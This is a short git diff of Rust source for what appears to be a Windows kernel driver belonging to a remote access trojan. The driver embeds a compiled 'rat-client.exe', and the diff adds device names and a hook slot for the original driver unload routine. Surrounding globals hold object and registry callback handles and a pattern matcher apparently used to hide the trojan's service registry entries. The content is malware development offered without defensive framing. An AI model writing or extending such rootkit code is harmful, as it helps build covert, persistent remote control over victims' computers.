@@ -28,12 +28,17 @@ pub const RAT_CLIENT_SERVICE_PATH: &U16CStr = u16cstr!(formatcp!(
 
 pub const ALTITUDE: &U16CStr = u16cstr!("360000");
 
+pub const DOS_NAME: &U16CStr = u16cstr!(formatcp!("\\DosDevices\\{RAT_CLIENT_SERVICE_NAME}"));
+pub const DEVICE_NAME: &U16CStr = u16cstr!(formatcp!("\\Device\\{RAT_CLIENT_SERVICE_NAME}"));
+
 #[cfg(debug_assertions)]
 pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe");
 
 #[cfg(not(debug_assertions))]
 pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");
 
-pub static SERVICE_REGISTRY_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
 pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
+pub static SERVICE_REGISTRY_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
 pub static CM_REGISTER_CALLBACK_COOKIE: AtomicI64 = AtomicI64::new(0);
+
+pub static ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
